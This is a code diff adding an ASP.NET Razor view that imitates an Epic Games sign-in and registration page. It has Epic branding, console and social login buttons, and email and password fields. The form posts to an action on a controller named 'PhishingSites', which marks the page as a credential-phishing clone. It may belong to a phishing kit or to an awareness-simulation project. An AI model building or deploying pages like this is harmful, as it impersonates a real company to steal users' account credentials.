@@ -1,0 +1,69 @@
+@{
+    Layout = null;
+    
+}
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title></title>
+    <link rel="stylesheet" href="~/css/epic.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/css?family=Hind&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" charset="utf-8"></script>
+    
+  </head>
+  <body>
+  <div class="login-form">
+    <div class="logo"><img src="~/images/logo.png" alt=""></div>
+
+    <div class="social-media">
+      <button class="fb"><img src="~/images/fb.png" alt=""></button>
+      <button class="google"><img src="~/images/google.png" alt=""></button>
+      <button class="ps"><img src="~/images/ps.png" alt=""></button>
+      <button class="xbox"><img src="~/images/xbox.png" alt=""></button>
+      <button class="switch"><img src="~/images/switch.png" alt=""></button>
+    </div>
+
+    <h6>Register</h6>
+
+    @using (Html.BeginForm("EpicCard", "PhishingSites", FormMethod.Post))
+    {
+      <div class="textbox">
+        <input type="text" placeholder="Email" required>
+        <span class="check-message hidden">Required</span>
+      </div>
+      <div class="textbox">
+        <input type="password" placeholder="Password" required>
+        <span class="check-message hidden">Required</span>
+      </div>
+      <div class="options">
+        <label class="remember-me">
+          <span class="checkbox">
+            <input type="checkbox">
+            <span class="checked"></span>
+          </span>
+          Remember me
+        </label>
+        <a href="#">Forgot Your Password</a>
+      </div>
+
+      <input type="submit" value="Register Now" class="login-btn" id="submit-id">
+      <div class="privacy-link">
+        <a href="#">Privacy Policy</a>
+      </div>
+    }
+
+    <div class="dont-have-account">
+      Don't have an Epic Games account?
+      <a href="#">Sign Up</a>
+    </div>
+    
+  </div>
+  <script src="~/js/card.js"></script>
+  <script src="~/js/epic.js"></script>
+  <script src="~/js/epicRequirement.js"></script>
+  </body>
+</html>
+
